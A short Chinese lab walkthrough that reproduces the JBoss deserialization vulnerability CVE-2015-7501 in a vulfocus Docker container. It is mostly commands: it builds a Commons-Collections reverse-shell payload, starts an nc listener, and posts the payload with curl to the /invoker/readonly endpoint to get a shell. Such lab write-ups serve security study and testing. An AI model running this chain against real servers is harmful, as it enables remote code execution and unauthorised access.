漏洞复现（jboss反序列）
2022-04-06 11:35:01

项目：vulfocus/jboss-cve_2015_7501

docker拉取镜像，docker pull vulfocus/jboss-cve_2015_7501

查看拉去的镜像,docker images

启动镜像，映射端口随意（空闲即可）,docker run -tid -p 38080:8080 vulfocus/jboss-cve_2015_7501

列出容器,docker ps

查看ip地址并打开如下：192.168.121.128:38080

访问网站页面invoker/JMXInvokerServlet,如果下载则存在该漏洞

进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/

解压完，进入到这个工具目录 ,执行命令:javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

若显示没有javac，执行命令：apt install default-jdk，然后再执行上一步

继续执行：java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap ip:port,

这个IP为攻击机ip，端口为监听端口

开启监听，nc -lvnp port

攻击机执行 curl ip:prot/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser,该ip与port为被攻击网址漏洞与端口

查看监听，whoami
